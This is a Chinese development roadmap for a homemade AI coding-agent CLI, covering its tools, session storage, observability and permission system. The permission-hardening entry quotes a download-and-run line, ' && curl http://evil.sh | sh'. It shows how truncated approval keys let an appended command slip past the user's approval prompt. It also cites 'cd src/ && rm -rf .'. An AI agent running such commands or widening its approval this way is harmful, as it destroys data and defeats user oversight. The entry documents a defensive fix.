   # 🗺️ 项目开发路线图

> 按**底层依赖 → 重要程度**排序。下层模块完成后才能支撑上层功能。

## ✅ 已完成

> 表中每行末尾的「全库 N 套 M 项」是**该里程碑当时**的口径，属**历史记账**（像追加日志一样只写不改），
> 不是现状；当前口径唯一来源是 [TESTING.md](./TESTING.md)，且其中那句统计已交给生成区自动维护。
> **2026-09-11 起新行不再重复全库口径** —— 它此前是一张"穿着快照外衣的追加日志"，逼得数字校验为它
> 特判"只认末行"（否则改一次测试就得回头改写历史行）；本轮去重把那个特例连根删了。

| 模块 | 说明 |
|------|------|
| 项目骨架搭建 | ESM + TypeScript 严格模式，core/harness/runtime/io/utils/llm 分层 |
| Harness 启动编排 | check() → main() 模式，闭包工厂创建 Runtime |
| REPL 交互循环 | getUserInput() → runtime.prompt() → onToken 流式输出 |
| LLM Provider 抽象 | LLMProvider 接口 + DeepSeek/Anthropic 实现（chat + stream） |
| Session 存储接口 | SessionStorage 接口 + InMemorySession + MockSession |
| 配置检查 | config/active-config.json 读取 → createProvider → CheckResult 注入 Runtime |
| 流式输出 | SSE 解析 + async generator + onToken 回调逐字显示 |
| **会话树存储（P0）** | JsonlSessionStorage 升级为 entry 树 + leaf + fork + compaction |
| **上下文管理（P0）** | 超限压缩为 compaction entry 入树，增量判断 |
| **命令系统（P1）** | 自动扫描加载：/help /clear /model /edit_model /usage /history /sessions /diagnostics |
| **模型切换（P1）** | /model 两级导航选供应商+模型，/edit_model 修改配置，运行时热替换 LLM |
| **对话历史（P1）** | /history 查看/分叉，fork 复制前缀到新文件（不破坏原历史） |
| **工具系统（P2）** | 内置工具 + function calling（结构化 tool_calls）。工具数随 P7 增补：落地时 4 个（read/write/grep/bash），现为 7 个（ls/read/write/edit/grep/bash/todo） |
| **技能系统（P2）** | SkillLoader 加载 .pi/skills/*.md 模板 |
| **事件订阅（P3）** | PromptEventEmitter subscribe/emit，stream_text/tool_call/error 等事件 |
| **多会话管理（P3）** | /sessions 切换/新建，/history 分叉出多分支 |
| **配置系统增强（P4）** | config/manager 配置分层（环境变量>全局>项目）+ Provider 对象抽象 + /model 自定义供应商 |
| **错误日志与诊断（P4）** | Diagnostic 公共类型 + runtime 诊断队列 + /diagnostics 查看 + debug-runtime.log 落盘 |
| **启动自检增强（P4）** | check() 逐项检查（配置/API key/连通性/模型列表）+ 严重度分级 + check 事件 |
| **可观测性增强（P6）** | 事件语义层：总线盖 at/seq/turnId + 打卡机 trace()/beginSpan() + 四组骨架 span + 便签通道 + trace-log watcher 落 JSONL + L3 两条流式协议的真实 usage + SpanCollector 公共配对件与 /traces 内置命令 |
| **启动提速（P6）** | 第一档网络探测后台化 + 第二档启动关键路径 0 网络请求（模型列表内存预热 + /model 按需现拉） |
| **精准编辑工具（P7）** | `edit`：oldText 唯一命中才改，0 命中 / 多命中都拒绝且一字不落盘（多命中回候选行号），CRLF 与 BOM 字节级保真；配套 `ToolDefinition.permissionDetail?` 让权限弹窗看得清改哪里 |
| **授权边界精确化（P6）** | 授权匹配从“args JSON 前 80 字符 + 前缀匹配”换成“工具定义的边界 + 精确匹配”（`ToolProvider.permissionKey?`），`clear()` 接进会话生命周期；关掉架构债 #10 |
| **工具可靠性修复（P7）** | `grep` 从“shell 出去调系统 grep”改成纯 Node 遍历（改前在中文 Windows 上**一次也搜不到**，且把“命令跑不起来”谎报成 `[NO_MATCH]`），四类返回前缀分开；`bash` 的子进程输出解码从硬编码 GBK 改成“UTF-8 严格探测 + 平台代码页回退”（`decodeChildOutput`），行数/字符数统一按截断前算；配套 `scripts/verify-tools.ts` 74 项，全库 15 套 556 项 |
| **失败分类补全（P7）** | `[INVALID]`（参数不合法）计入失败——改前“重复失败保护”对“模型把参数写错”这一整类**完全失效**（实测 grep 缺 `pattern` 连传三次，`if (failed)` 一次也没进、`[系统提示]` 一次也没注入）；根因是分类表里没给它留位置（判定式是白名单，落不进任何一类就等于默认不计）。配套 A4/A5 **对照组**（有效否定 `[NO_MATCH]` 仍不计），并查出两条**假绿**源码断言（E11/C4 的子串匹配在第三个前缀同行时照样绿）改为名单精确相等，全库 15 套 560 项 |
| **工具参数校验框架（P6）** | 新增 `tools/spec.ts`（自研，**不引** Zod / TypeBox）：一份 spec 派生三样——发给 LLM 的 `parameters` / 运行时 `parse` / handler 入参类型，6 个工具全走 `defineTool`；`ToolDefinition.parse?` + `registry.execute()` 接线，让那份 Schema **第一次真正生效**（改前 `execute()` 只有 3 行、`tool.parameters` 一个字段都没读，实测缺参 / 传对象 / 传 Schema 里不存在的参数名——三次全部 `[OK]`）。堵住 `String(val)` 那个“永远通过的校验”留下的四个类型盲区与多余参数静默忽略；配套 `scripts/verify-spec.ts` 45 项 + `fixtures/tool-schemas-baseline.json` 护栏（Schema 逐字未变），全库 16 套 605 项 |
| **内层引导（P7）** | steering 的消费点从**外层循环**下沉到**内层工具边界**：`AgentLoopOptions.takeSteer?` 在工具跑完、下一次 `llm.stream()` 之前取件，追加进最后一条 tool 结果，让用户执行中途插入的话进**本轮**上下文。改前 `AgentLoop` 的 `for` 循环**一处队列检查都没有**，steer 与 followUp 的实质差别只剩优先级——名字许了没兑现的承诺。**不能新开 user 消息**：tool 结果在 `anthropic.ts` 里已是 `user` 角色，连续两条 user 直接 400，故沿用重复失败提示 / 收尾提示的“寄生追加”手法。两条“不吞消息”护栏（本轮无工具调用 → 不取件；已是最后一轮 → 不取件）经**变异测试**验证承重；端到端实测 3 次 LLM 往返内送达（摘掉接线立刻变 4 次）；配套 `scripts/verify-steering.ts` 28 项，全库 17 套 633 项 |
| **内层引导落盘 + 同角色归并（P7 收尾）** | 借债 11 关闭：`runSingleTurn` 在 `appendMessage('assistant')` **之前**把被内层吸收的引导落盘为独立 user 条目（内容带 `STEER_PREFIX` = `[用户引导] `），时序忠实；`toAnthropicMessages` 的 `user` 分支相应从**无条件 push** 改成**能并则并**（与既有的连续 tool 结果合并同层同手法）——这个洞此前**不可达**，落盘后才会被踩到；`/history` 把这类条目标成 `⚡ 中途引导`。落盘后 OpenAI 兼容路径会真的发出连续两条 user（原样透传、零归一化），标准语义容忍，已用 S10 钉成**登记性断言**而非埋在注释里。**债 11 的一半前提同时被核查推翻**：官方 API 参考称连续同角色轮会被服务端合并（5 个官方镜像逐字一致），与第三方 400 报告冲突且本机无法裁定，故修法与前提**解耦**（本地归并幂等——服务端本会合并时无害、真拒绝时救命）。配套 `verify-steering.ts` 28 → 48 项 + 四组变异测试各自精准变红，全库 17 套 653 项 |
| **文档数字校验 + 稳定锚点（P7 收尾）** | `Log/` 的数字纪律此前**全靠人肉**：套数与项数在四份文档各写一遍、**每套的项数还在两处各列一遍**，而 `verify-docs.mjs` 只管锚点、不管数字——这是整套文档体系里唯一没有机器兜底的地方（历史也证明它会漂：653 / 633 / 605 曾同时躺在不同文件里）。新增 `scripts/check-doc-numbers.mjs`：**白名单式**拿 `run-verify` 汇总出的真值去核对「当前值」23 处 + 两处逐套表格（必须白名单——全库盲扫会命中追加日志与 ROADMAP 旧行里的**历史数字**，那些改了才是篡改历史快照），且**不计入项数**（否则"总项数对不对"取决于"有没有把校验自己算进去"，成了自指）。配套 `verify-doc-numbers.ts` 31 项（纯函数喂**合成文档**造红、含两组对照组）与三组变异测试。**上线首跑即点名 18 处漂移**，并顺带查出 TESTING 第三节两处**既有**错数（`check` 写 8 实际 10、`if (failed > 0) process.exit(1)` 写 1 实际 2）。另一半是**锚点解耦**：`verify-docs.mjs` 的锚点集合扩成「标题 slug ∪ 显式 id」，**新日志条目一律带 `<a id="log-<日期>-<短名>"></a>`**——锚点不再由标题文字算出，引用短、纯 ASCII、且不随日后重述标题而断，配套显式锚点卫生段（不重复 / 命名守约定 / **非空**）与 `ARCHITECTURE_LOG_RULES.md` 的约定。全库 18 套 688 项 |
| **文档去重 + 生成区（P7 收尾）** | 治的是根因，不是"谁忘了改"。上一轮把 23 处手抄都加进白名单**看着**，那治的是症状；真正的病是**同一个事实被抄了太多份**。本轮两路收口：**去重（L1）**——`ARCHITECTURE.md` 的测试行与债 5、`目录.md` 的职责表与 scripts/ 树逐套项数、`ROADMAP.md` 已完成表末行，全部不再重述当前口径、改为引用 TESTING.md，对应白名单条目整段删除（含 ROADMAP 那条必须"只认末行"的特判——它本来就是一张穿着快照外衣的追加日志）；**生成区（L2）**——TESTING 顶部与第二节划出 `<!-- BEGIN AUTOGEN:… -->` 区块，由新增的 `npm run docs:sync` 从**实测真值**写入，人一个字不碰。配套三个零依赖脚本：`autogen.mjs`（区段解析 + 渲染，纯函数，**写与查共用同一份模板**，故两边定义不可能分家）、`collect-stats.mjs`（真值采集，`run-verify` 与 `docs-sync` 共用同一份，避免"真值分家"）、`docs-sync.mjs`（写盘命令）。两条硬设计：**`verify` 保持只读**（`gofmt -l` 范式，不一致只报红、绝不顺手改文件）、**落盘渲染后的 Markdown 而非 `{{占位符}}`**（`Log/` 是给人**和** Agent 的 Read 直接读的，占位符会让两边都读到垃圾；这也正是它与零构建管线约束的兼容点）。白名单 **23 → 11 处**；顺带改正 TESTING 一处叙事错数（`verify-docs.mjs` 的"14 → 17"实为 **18**：+3 是新段，另 +1 是 ①② 统计的文档数从 6 涨到 7）。**本行刻意不写全库口径**，见上方表注 |
| **任务清单 C 方案（P7 收尾）** | 把 `TASK.md` 那套"文件即状态"（模型用 `write` 全量重抄清单、harness 用一个正则数复选框）升级成"**工具即状态**"。新增 `src/todo/store.ts`：`TaskStore` 是清单的**内存真相源**（`add/start/done/clear` 增量变更 + "唯一进行中"不变量 + `render()`/`fromMarkdown()` **严格互逆**）；新增第 7 个内置工具 `todo`（`op`/`index`/`text` 全标量、**返回值即带序号的整份清单**），模型改一个勾只传增量、不再重抄。`runtime.ts` 删掉逐请求读文件的 `loadTaskMemory()`，注入 `task` 层与轮数预算 / `thinking auto` 一律改读 store；`TASK.md` 降级为**投影 + 启动种子**（写盘由工具在变更后做、读盘只在 `main.ts` 启动时做一次），"全勾选即删"随之迁进 `projectToFile`/`loadFromFile`。配套 `scripts/verify-todo.ts` 50 项（含 render-parse 互逆的**属性测试**与两处"有没有未完成"判定**恒等**的对照） |

---

## 🔜 待开发（按优先级降序）

### P0 — 核心基础设施（项目运转的必要条件）

- [x] **持久化存储** — 实现 JSONL 文件存储后端（JsonlSessionStorage），对话历史可保存/恢复
  - 依赖：SessionStorage 接口已就绪
  - 影响：没有持久化，每次重启对话丢失
- [x] **上下文管理（上下文窗口控制）** — 超限时保留最近 10 条，丢弃早期消息并标注摘要
  - 采用：消息数量超过 20 条时触发滑动窗口压缩
  - 影响：LLM 上下文窗口有限，超过后对话崩塌

### P1 — 交互体验（Agent 可用的基础）

- [x] **命令系统** — 支持可扩展的 `/` 命令（`/help`, `/clear`, `/model`, `/sys` 等）
  - 依赖：无（`/exit` 已有，只需抽成注册表）
- [x] **模型选择与切换** — 运行时切换模型/Provider，不再写死在 JSON 里
  - 依赖：LLM Provider 抽象已就绪，只需加 CLI 参数或 `/model` 命令
- [x] **对话历史管理** — 展示历史消息，支持回溯、编辑（/history 分叉）

### P2 — Agent 能力扩展

- [x] **工具系统（Tool System）** — Agent 调用外部工具的能力（文件读写、bash、搜索等）
  - 依赖：上下文管理、命令系统
  - 影响：没有工具，Agent 只能聊天不能操作
- [x] **技能系统（Skill System）** — 可加载的技能模板（`.pi/skills/*.md`）
  - 依赖：命令系统、工具系统

### P3 — 高级交互

- [x] **事件订阅模式** — 用 subscribe/emit 替代 onToken 回调，支持 stream_token / tool_call / error 等细粒度事件
  - 依赖：无（可与当前回调模式并行）
  - 驱动因素：UI 需要区分"正在输出"、"正在调工具"、"出错了"等状态
- [x] **多会话管理** — `/new`（新会话）、`/fork`（分叉）、`/switch`（切换）
  - 依赖：持久化存储、命令系统
- [x] **RPC 模式** — JSON-RPC over stdin/stdout，供编辑器插件调用（非流式；流式 TODO）
  - 依赖：命令系统、事件订阅
  - 注：非流式 chat 一次性返回；Pi 式流式（text_delta 通知）留 TODO

### P4 — 可靠性工程

- [x] **配置系统增强** — 从 `config/api.json` 扩展到分层配置（全局/项目/会话级）
- [x] **错误日志与诊断** — 结构化的错误收集、诊断报告
- [x] **启动自检增强** — 网络连通检测、API key 有效性验证、模型列表拉取

### P5 — 架构演进（规模化）

- [x] **多系统拆分** — 从单 runtime 链拆分为独立子系统（存储/执行/检索等），按 Pi 模式：
  - 每个子系统一个接口（core/ 9 接口：storage/tools/permission/events/compaction/loop/commands/diagnostics/compaction-store）
  - 实现分类：执行类 Service（Impl）/ 能力提供类 Provider / 数据类 Storage/Store/Bus
  - 依赖注入组装（main 组装，Runtime 只依赖接口，全部必注入）
  - 命名规范统一：执行类 Service、提供类 Provider、命令迁 commands/builtin/

### P6 — 成熟度补齐（对标 Cline / Pi）

> 功能 P0-P5 已齐，以下为对标成熟 Agent 框架（Cline/Pi）缺失的能力，按价值排序。

- [x] **正式测试套件** —（2026-09-03 关闭，**不引入 vitest**）原案是“引入 vitest，为 session/compaction/commands/rpc 等子系统建立正式单测（当前仅临时脚本）”；痛点“P5 大重构后零回归保护”已由另一条路解决——`scripts/` 下 **12 套零依赖验证脚本、359 项断言**，`npm run verify` 一条命令串跑、退出码可直接交给 CI（原先“只能手工循环跑”的缺口由本轮新增的 `run-verify.mjs` 补上）。四个子系统里 session 已有专套（`verify-session.ts` 47 项），compaction / commands / rpc 仍靠间接覆盖，这部分缺口保留在 TESTING.md 第七节
  - 理由：P5 大重构后零回归保护，改 bug 可能悄悄破坏别处
  - 对标：Pi 有 vitest.config.ts + 完整测试
- [x] **系统提示词模板层** —（2026-09-04 核实后关闭，实现与原案不同）原案：从 runtime.ts 硬编码字符串抽为模板（system-prompt.ts），支持按场景选择
  - 已落地的是 `context/system-prompt.ts` 的 `SystemPromptServiceImpl`：配置驱动 + 五层分层（core → tools → skills → task → summary，稳定前缀与变化内容分开，为缓存友好）+ 段落可插拔（`context/sections/` 三个内置 + `extensions/sections/` 用户扩展）+ hook 可改写（`before_build` / `before_request`）
  - “按场景选择”没做成模板枚举，而是靠 `SectionFn` 收 `ctx` 自行决定返不返回内容（如 tools 段在 `ctx.tools` 为空时返回 undefined 直接跳过本段），新增一个场景不必改模板表
  - 理由：硬编码不可扩展，影响 Agent 能力演进
  - 对标：Pi 的 prompt-templates.ts / system-prompt.ts
- [ ] **分支摘要** — fork 后把旧分支摘要塞回新分支上下文
  - 理由：当前 fork 只复制前缀，新分支 LLM 不知道旧线聊过什么
  - 对标：Pi 的 branch-summarization.ts
- [ ] **Hook 系统** — 工具调用/消息生命周期钩子（beforeToolCall/afterToolCall 等）
  - 理由：扩展 Agent 行为（拦截/转换/记录），当前仅 inputHandlers 简单预处理
  - 对标：Pi 的 hooks.md / Cline 任务生命周期钩子
  - 进度（2026-09-04 核实）：**提示词层与旁观层的钩子已落地**——`EventBus.on(type, handler)` 的返回值经 `emitHook` 收回、能改写流程（现有 `before_build` / `before_request` 两个挂点，`extensions/hooks/` 自动装载），`extensions/watchers/` 只订阅不改流程（ctx 里刻意不给 `on`）；**工具调用生命周期钩子仍无**：全 src/ 搜 `beforeToolCall` / `afterToolCall` / `before_tool` / `after_tool` 零命中，故本条仍留待办。`runtime.onInput()`（输入预处理）也仍空着，见 ARCHITECTURE.md 第四节第 7 条
- [ ] **会话仓库层** — 从 jsonl-storage 抽出 repo 层（会话列表/管理/删除）
  - 理由：区分"单会话存储"与"会话管理"，支持多会话完整操作
  - 对标：Pi 的 jsonl-repo.ts
- [ ] **技能系统补全** — SkillLoader 热重载 + 依赖追踪（当前 TODO）
  - 对标：Pi 的 skills.ts
- [x] **工具参数校验框架** —（2026-09-06 落地，实现与原案不同）原案：从手动 requireString 升级为 schema 自动校验
  - 落地的是 `tools/spec.ts`（**自研**，不引 Zod / TypeBox）：5 个构造器（`str` / `strAllowEmpty` / `optStr` / `optPosInt` / `optBool`）覆盖现有 16 个字段，一份 spec 派生三样——`toJsonSchema()` 出发给 LLM 的 parameters、`parseSpec()` 做运行时审核并补默认值、`Infer<typeof spec>` 推 handler 入参类型；`ToolDefinition` 加**可选**成员 `parse?`，`registry.execute()` 在 handler 之前跑它（`ToolInputError` → `[INVALID]`，别的异常穿透），6 个工具全走 `defineTool()`、删掉 4 个校验件共 18 处
  - “自动校验”这一步的实测根据：改前 `execute()` 只有 3 行、`tool.parameters` **一个字段都没读**——造一个 `required: ['mustHave']` 的工具，①什么都不传 ②传一个对象 ③传 Schema 里根本不存在的参数名，三次全部 `[OK]`，所以那份单子的身份是“给模型的建议书”。另堵掉 `String(val)` 那个**永远通过的校验**留下的四个类型盲区（`123` / `{a:1}` / `['src']` / `true` 改前全过关，到文件系统层才报 `[NOT_FOUND]` / `[NOT_FILE]`，归因错层会让模型去猜路径）与多余参数静默忽略（`{pattern:'x', pathh:'typo'}` 让 `path` 退回默认 `'.'`，搜完整个项目还报 `[OK]`）
  - 理由：工具参数校验标准化（原案这句成立，但真病不是“两份副本可能不一致”，而是“没人执行”）
  - 对标：Cline 工具参数 schema 校验——**不引它的依赖**（Zod 还要 `zodToJsonSchema` 这座**有损**的桥，而本项目零运行时依赖是既有立场），三选一取舍见 DECISION_LOG 2026-09-06
  - 剩余（未立项）：结构化返回值（handler 仍返回字符串前缀，前缀仍是工具层与消费层之间唯一的协议；ARCHITECTURE_LOG 2026-09-05 那块写的“那是工具参数校验框架那一步的事”，本轮只做了参数校验这一半）· `parse` 是可选成员，手写一个不走 `defineTool` 的工具绕过全部校验是合法的（编译期不拦，防线是 verify-spec ⑤/⑥ 段的源码断言）
- [x] **可观测性增强** — 结构化 trace/span 观测层（2026-09-02 落地：总线 emit() 盖 at/seq/turnId 公共头 + SpanRecorder 打卡机（trace 自动配对 / beginSpan 手动）+ 四组骨架 span 覆盖三重循环（prompt/llm_request/tool_call/compaction）+ note_start/note_end 便签通道 + trace-log hook 落 trace.jsonl，verify-events 55 项）
  - L3 真实 usage 同日补齐：两条流式协议各自取用量（OpenAI 兼容靠 stream_options.include_usage 显式索取 + 撞 400 自动降级，Anthropic 靠 message_start 输入三项相加 + message_delta 输出累计值），AgentLoopResult 逐轮合计、任一轮缺失即整体 null，verify-usage 22 项；实测同一条冒烟的 promptTokens 从估算 26 变真值 2834（估算没算 system prompt 与 5 个工具描述）
  - 对标：Pi 的 docs/observability.md
  - 剩余（未立项，按需再做）：非流式 chat() 的用量回流（ChatResult 无 usage 字段，compaction 摘要调用消耗的 token 从未计入 totalUsage）· 缓存命中率明细（现被合并进 promptTokens，LLMUsage 只有三个槽）· 显式 parentId 树形（现靠 turnId + 时间区间包含关系重建）· 51 处裸 console 收编进总线
- [x] **/traces 内置命令 + SpanCollector 公共配对件** —（2026-09-03 落地）把 trace-log watcher 里的 span 配对逻辑抽成 runtime/span-collector.ts（契约 SpanCollector / CollectedSpan 进 core/events.ts，与生产端的 SpanRecorder 对称：一个帮打卡、一个帮收段），watcher 从 134 行瘦到 78 行、只剩"开关判定 + 落盘格式 + 退出补记"；新增 /traces 命令就地看最近段的耗时/成败/此刻在跑的是哪段，支持条数与段名过滤；两个消费者各持独立实例（核心命令不反过来依赖可选扩展）；verify-events ⑨ 段 21 项，全量 299 项
  - 理由：看一段耗时不该先开 FLINT_TRACE 落盘、再翻 jsonl 文件；而配对逻辑虽然只有一份，却住在可选扩展里，核心命令拿不到
  - 对标：把观测结果做成内置命令随手可查（而不是只能翻落盘文件）的通行做法；不引入 LangSmith / LangFuse 这类外部服务与依赖，只保留内存环形队列
- [x] **启动提速·第二档：模型列表移出启动关键路径** —（2026-09-02 落地，实现与原案不同）原案是"/models 结果落本地缓存带时间戳（TTL 约 24h）"，调研后发现 getModels() 的 9 个调用点里只有 /model 二级选择器真需要远程列表，落盘那套机械（缓存文件/TTL 失效/baseUrl 变更失效/gitignore）换不到额外收益，改为**内存预热**：删掉 getConfigManager() 里的 init()，启动路径 0 网络请求（实测 check() 760ms → 0.7ms）；main.ts 界面渲染前 fire-and-forget 预热有 key 的几家，/model 二级展开前 ensureModels（5 分钟新鲜期内零等待，还在飞则复用在飞 promise）；Provider 加 modelsFetchedAt 且只在真拿到列表时盖戳；verify-startup 32 项
  - 理由：模型列表几乎不变，没必要每次启动现拉；断网时启动照样过（列表有静态兜底、自检 probeStartup 本就在后台）
  - 对标：Cursor / Cline / Continue 把网络依赖移出启动关键路径的通用手法（"落盘缓存"这一层按本项目实际消费面裁掉，三选一的取舍见 DECISION_LOG 2026-09-02）
- [ ] **启动提速·第三档：预编译发行** — tsc 编译到 dist/，启动脚本改跑编译产物，省掉 tsx 每次启动的即时转译开销；可选再进一步打包单文件二进制（第一/二档完成后收益递减，优先级最低）
  - 理由：解释器冷启动 + 全源码转译是启动时间的固定底噪，编译产物一劳永逸；但收益比前两档小且需配套发行流程（版本/源码映射）
  - 对标：Claude Code / Codex CLI 发行打包 bundle 而非源码现转译
- [x] **现状类文档校准** —（2026-09-03 落地，范围比原案大）ARCHITECTURE.md / TESTING.md / GLOSSARY.md 三份停在项目早期，与代码直接矛盾（2026-09-03 查出具证：分层图仍写 AnthropicProvider 与 ui.ts 为 TODO；TESTING 列的 Agent 类不存在；GLOSSARY 3 条标"计划中"却已落地、2 条指向不存在的文件路径）
  - 理由：append-only 的四份日志天生不会烂，会烂的是"现状快照"；目录.md 因每轮同步所以准，这三份没进这个习惯，越晚校准越多条目需要重写
  - 建议顺序：GLOSSARY 逐条核（共 41 条，新增的 11 条观测层词条是准的，只需校准旧的 30 条）→ TESTING 改写成"10 套 verify + 299 项断言 + RPC 冒烟"的真实测试体系 → ARCHITECTURE 重画分层图（补 core 契约层、工具/权限/压缩/诊断子系统、扩展三口子、观测旁路）
  - 落地：按建议顺序执行，但每一步的实际工作量都比预估大——GLOSSARY 逐条拿代码验证后查出 **23 条失真**（不是只需校准旧的 30 条里的一部分，而是过半），修正后另新增 8 条已验证术语（→ **49 条**，新建 J、U 两节）；TESTING 旧版的示例代码照抄会编译不过（三处类型错 + `new Runtime` 缺 11 个必注入），逐条修不如整份改写，现 7 节 96 行；ARCHITECTURE 分层图扩成 6 层 + 两条横切旁路（209 行），决策 1/2/4/5/6 逐条补现状、对比表 5 行里 4 行已反转故全部重写，并新增第四节"已知架构债"7 条
  - 超出原案：`目录.md` 也跟着校准了一轮（三个幽灵条目 CLAUDE.init.md / src/utils/error-log.ts / src/persistence.ts、core 契约 9→11、内置工具 4→5 漏了 ls、io/ui/permission.ts 实为 permission-prompt.ts、runtime/ 漏 4 项、补 skills/ 与 sessions/）——它虽然每轮同步，但同步的是"新增了什么"，删掉和改名的东西会留下幽灵
  - 校准过程中查出的**代码级**问题（不属文档任务，需另立）：两个同名 `SessionStorage` 接口注释互相矛盾而 `instanceof` 才是现状（core/storage.ts 那版的三个可选成员白定义了）· `AgentConfig` 是死类型 · 压缩用量没回流导致 `/usage` 少算 · `package.json` 无 verify/test 入口且 `clean` 是 `rm -rf dist` 在 Windows 跑不通 · `src/runtime/commands/` 是空目录、`input-handler-demo.ts` 是演示文件，两者去留待定 · 内置 `ls` 工具已落地，下面 P7 的"实用工具补全（ls）"该划掉一半
- [x] **校准查出的代码级问题批量处理** —（2026-09-03 落地）上一条末尾列了 6 个代码级问题，本轮处理掉 5 个（那条是 append-only 的历史记录，里面提到的 `input-handler-demo.ts` 已不存在，以本条为准）：
  - ✅ **两个同名 `SessionStorage` 接口已收敛**：`types.ts` 改成只做转发、`RuntimeOptions.session` 直指 core 版、`runtime.ts` 四处 `instanceof` 换成能力探测（那四处调的正好就是三个可选成员，行为等价）；新增 `verify-session.ts` 47 项，把“探测 ≡ instanceof”的 3×3 穷举对比钉死
  - ✅ **`AgentConfig` 死类型已删**（删前核实全库引用只有 1 处，就是它自己的定义）
  - ✅ **`package.json` 已补 `verify` / `typecheck` / `clean` 三个入口**；`clean` 从 `rm -rf dist`（Windows 跑不通）改为 `node scripts/clean.mjs`（`fs.rmSync` 的 recursive + force）；新增 `run-verify.mjs` 串跑 12 套（全量 359 项、EXIT=0，三个 npm 入口均实测跑通）
  - ✅ **`input-handler-demo.ts` 已删**（连同 `main.ts` 里的 import 与注册）。删前查出它会静默吞掉 `@@` 开头的输入、把 `/ask ` 转成加问号，属**未文档化的魔法行为却挂在生产路径上**；`runtime.onInput()` 能力本身保留给下面的 Hook 系统
  - ✅ **GLOSSARY 5 处同文件锚点死链修好**（`#项目元数据` ×4、`#event-subscription` ×1，按该文件其余 30+ 处已用的“全 slug 含中文后缀”约定对齐），并把检查固化为 `verify-docs.mjs`；其中“入站锚点契约”6 条把被 DECISION_LOG / GLOSSARY 引用的标题文字钉死（DECISION_LOG 是 append-only，断链没法在源头修，只能不让标题变）
  - ⏸ **压缩用量没回流（`/usage` 少算）本轮不做**：要改就得改 `ChatResult` 的形状，牵连两个 provider 的非流式路径 + `stream-helper` + 多套 verify 脚本，是独立的一件事，已在上面“可观测性增强”的剩余项里
  - 遗留两项：`src/runtime/commands/` 空目录仍在（git 不跟踪空目录，仓库里本就没它，只是本地残留）；另查出 **`InputHandler` 同名冲突**（`runtime.ts` 的函数类型 vs `io/ui/input-handler.ts` 的类），未改、只在两处各加注释互指，详见 ARCHITECTURE.md 第四节第 8 条
- [ ] **历史结构化数据接通** —（2026-09-04 立项）让跨用户轮的历史带上 `tool_calls` / `tool_call_id` / `name`，使模型看得到上一轮真正调了什么工具、结果是什么
  - 现状：`MessageEntry` 的格式**早就支持**（三个可选字段 + `appendMessage` 的 `extra` + `getMessages()` 的还原），但是**双向死路**——入口没人写（`runtime.ts` 两处 `appendMessage` 都不传 `extra`，`agent-loop.ts` 里一处 `appendMessage` 都没有，尽管存储层头注释声称调用方含“Agent 循环”），出口被堵（`runtime.ts` 组装 `toolMessages` 时只映射 `role` + `content`）
  - **前置障碍（不能只接线）**：出口那道丢弃是**承重的**。`resolveAnthropicThinking` 的安全阀一见“带 `tool_calls` 但无 `thinkingBlocks` 的 assistant 消息”就强制关 thinking，而 `thinkingBlocks` 永不落盘——直接透传会让任何有过工具调用的会话把 extended thinking **静默全程关闭**（看上去像修好了历史保真度，实际是拿推理能力换了它）。要接通必须先定 thinking 块的历史策略：要么落盘 `signature`（体积 + 敏感数据），要么把带工具调用的历史轮折叠成文本（丢工具语义）
  - 依赖：无硬依赖；但若同时要落盘 tool 结果消息，需给 `AgentLoopServiceImpl` 注入 session（当前它拿不到，只拿到 events）
  - 本轮已做的部分：行为一行未改，只把五处失真措辞改正、三处承重位置加警告注释，并把“入口未接线 + 出口承重”固化为 `verify-session.ts` ⑨ 段断言（下次谁想“顺手补全”先撞上测试）。详见 ARCHITECTURE.md 第四节第 9 条
- [x] **授权边界精确化** —（2026-09-04 落地）关掉 ARCHITECTURE.md 第四节第 10 条架构债：`permission/manager.ts` 的 `startsWith` 前缀匹配换成 `Set<string>` 精确匹配，`agent-loop.ts` 的授权兜底键不再 `.slice(0, 80)`，三个需确认的工具各定义一个 `permissionKey`（write / edit = 归一化 path，bash = 完整命令）
  - 修掉的是**静默扩权**（实测，不是推导）：批准 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行——两个键在 80 字符处截成了逐字符相同的串。用户点的是“允许这一条”，系统给出的是“允许前 80 字符相同的所有调用”
  - 顺带关掉“前缀级授权”：授权 `write:src/x.ts` 不再放行 `write:src/x.ts.bak`；也顺带让注释里声称却一次也未生效过的目录级授权彻底消失（它本来就是失真的：真实调用方传的键含内容片段，换一个文件甚至换一段内容就失配）
  - `clear()` 接线（项目第三处“支持但未接线”，前两处：`runtime.onInput()` / 上一条的 tool_calls 持久化）：`runtime.clearSession()` 连带清授权，“本次全部允许”终于等于本次会话而不再是本进程；`/clear` 的说明与回执同步改口（UI 不说谎）
  - `bash` 补 `permissionDetail`，兑现它 `description` 参数上“仅用于权限确认提示”那句从未生效的承诺
  - ⚠ **以本条为准**：上面“精准编辑工具（P7）”末段那句“匹配键格式与改前逐字符相同，已记下的‘本次全部允许’不会失配”是 `edit` 那轮的事实，**本轮已不再成立**（匹配键换了；授权只存内存的 Set、从不落盘，所以换格式没有迁移问题）；那条写的“7 处替身”当时实为 **6** 处，本轮新增 `verify-permission.ts` 那处后才真是 7（append-only 不改原文）
  - 刻意不做：目录级 / 通配授权（`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`）；命令级白名单（需命令语义解析）。write / edit 的键不含内容 → “本次全部允许”= 本会话内不再问这个文件，这是**刻意的放宽**，取舍与四条代价见 DECISION_LOG 2026-09-04
  - 验证：新增 `scripts/verify-permission.ts` 62 项（7 段：含“改前的截断键确实把这两条命令判成同一个键”的**对照组**，以及 ⑦ 段造真 `Runtime` 数 `clear()` 被调几次的**行为证明**）；`verify-edit.ts` 的 A5 与头部承重设计③ 跟着改（源码形状变了）；全量 14 套 482 项、tsc --noEmit 均 EXIT=0
  - 对标：Cline 的 per-tool 权限上下文（每种工具自己决定“一次授权覆盖多大范围”），而不是把授权键的形状写死在权限子系统里

### P7 — 业务能力强化（让 Agent 真正解决实际问题）

> 工具/架构已齐，以下为提升 Agent"解决真实编码任务"能力，按见效速度排序。

- [x] **系统提示词强化** —（2026-09-04 核实后关闭）原案：从"别乱调工具"升级为"教 Agent 解决任务的流程"：
  - 拆解问题 → 分步执行 → 验证 → 迭代
  - 如何用工具组合完成多步任务（先理解再动手）
  - 遇到错误如何排查重试（读错误 → 定位 → 修复）
  - 写完代码跑测试验证
  - 理由：同样工具，提示词决定 Agent 是"会说话"还是"会干活"，成本最低见效最快
